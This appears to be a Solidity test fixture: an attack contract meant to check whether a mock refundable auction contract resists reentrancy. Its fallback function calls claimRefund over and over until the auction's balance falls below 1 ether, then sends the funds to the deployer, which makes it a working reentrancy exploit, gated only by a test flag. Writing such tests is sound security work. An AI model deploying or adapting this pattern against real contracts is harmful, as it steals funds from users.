pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./mocks/RefundableAuctionImpl.sol";

contract AttackContract {
    RefundableAuctionImpl public auction;
    address payable public owner;
    bool public isTest;

    constructor(address payable _auctionAddress, bool _test) {
        require(_test, "AttackContract is for test only");
        auction = RefundableAuctionImpl(_auctionAddress);
        isTest = _test;
        owner = payable(msg.sender);
    }

    // Start the re-entry attack
function attack() external payable {
    require(isTest, "AttackContract is only for test");
    auction.claimRefund();
}

    // Fallback
    fallback() external payable {
        if (address(auction).balance >= 1 ether) {
            auction.claimRefund();
        } else {
            owner.transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
